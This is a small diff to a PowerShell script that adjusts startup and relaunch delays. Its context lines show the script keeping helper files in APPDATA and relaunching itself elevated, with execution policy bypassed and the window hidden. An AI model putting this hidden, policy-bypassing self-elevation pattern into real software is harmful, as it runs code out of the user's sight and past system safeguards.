@@ -22,7 +22,7 @@ $pause = [char]::ConvertFromUtf32(0x23F8)
 
 # Startup Delay
 if(Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){Sleep 15}
-Sleep 2
+Sleep 5
 # remove pause files
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.ps1"){rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force}
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force}
@@ -458,7 +458,6 @@ if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::
         Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
         }
     Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -File `"$env:APPDATA\Microsoft\Windows\temp.ps1`"") -Verb RunAs
-    Sleep 1
     rm -path "$env:TEMP\temp.ps1" -Force
     }
 }
